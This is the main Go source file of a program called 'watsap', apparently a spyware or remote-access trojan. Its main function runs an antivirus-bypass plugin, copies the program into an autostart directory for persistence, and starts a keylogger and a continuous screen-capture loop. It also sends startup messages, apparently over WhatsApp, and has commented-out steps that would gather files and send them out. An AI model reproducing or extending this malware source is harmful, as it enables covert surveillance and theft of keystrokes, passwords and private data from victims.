package main

import (
	"watsap/plugins/avbypass"
	"watsap/plugins/keylog"
	"watsap/plugins/screen"
	"watsap/utils"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/wainit"
)

func init() {
	config.DebugMode = false
	config.WaLogging = true
}

func main() {
	avbypass.Main() // initialize defendernot plugin
	//secure.SSLPinning()          // ssl pinning. BROKEN RIGHT NOW WILL FIX LATER
	wainit.InitWa()              // initialize watsap
	messages.StartupMessage1()   // send init message
	go utils.CopySelfToTempDir() // copy self to autostart dir
	//go files.InitFiles()         // initialize files
	//go files.CheckAndSendFiles() // check and send files
	go keylog.InitKeylog() // initialize keylogger
	go screen.LoopScreen() // loop screen capture
	select {}              // wait forever
}
